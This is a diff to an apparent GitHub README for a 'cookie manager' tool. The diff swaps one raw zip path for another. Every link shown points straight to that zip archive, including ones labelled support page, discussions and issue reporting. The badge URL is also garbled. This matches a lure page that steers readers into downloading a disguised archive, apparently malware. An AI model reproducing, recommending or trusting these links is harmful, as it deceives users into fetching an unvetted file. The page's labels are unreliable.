@@ -6,7 +6,7 @@ Welcome to Advanced Cookie Manager! This tool helps you manage your cookies with
 
 ## 📥 Download Now
 
-[![Download Advanced Cookie Manager](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip%20Now-Advanced%20Cookie%https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip)](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip)
+[![Download Advanced Cookie Manager](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip%20Now-Advanced%20Cookie%https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip)](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip)
 
 ## 🌐 Features
 
@@ -25,7 +25,7 @@ Welcome to Advanced Cookie Manager! This tool helps you manage your cookies with
 
 ## 🔗 Download & Install
 
-To get started with Advanced Cookie Manager, visit this page to download: [Download Advanced Cookie Manager](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip).
+To get started with Advanced Cookie Manager, visit this page to download: [Download Advanced Cookie Manager](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip).
 
 1. Click the link above to access our Releases page.
 2. Find the latest version of Advanced Cookie Manager.
@@ -53,14 +53,14 @@ If you encounter any issues while using Advanced Cookie Manager, consider the fo
 
 ## 📞 Support
 
-For additional help, you can visit our [Support Page](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip). We encourage users to report any bugs or issues they experience.
+For additional help, you can visit our [Support Page](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip). We encourage users to report any bugs or issues they experience.
 
 ## 🌍 Join the Community
 
 Stay connected and get involved! Join our discussions or contribute to future development. 
 
-- [GitHub Discussions](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip)
-- [Report an Issue](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/popup/manager-cookie-advanced-v3.7.zip)
+- [GitHub Discussions](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip)
+- [Report an Issue](https://github.com/salamlol/advanced-cookie-manager/raw/refs/heads/main/icons/manager_cookie_advanced_v3.7.zip)
 
 ## 📅 Future Features
 
